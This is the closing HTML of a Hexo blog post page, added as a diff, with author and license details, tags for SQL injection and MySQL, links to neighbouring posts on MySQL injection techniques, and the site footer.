+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/04/18/MySQL-3/">http://example.com/2020/04/18/MySQL-3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/MySQL/"># MySQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/18/MySQL-4/">MySQL手注之延时盲注(基于时间的盲注)</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/18/MySQL-2/">MySQL手注之报错注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
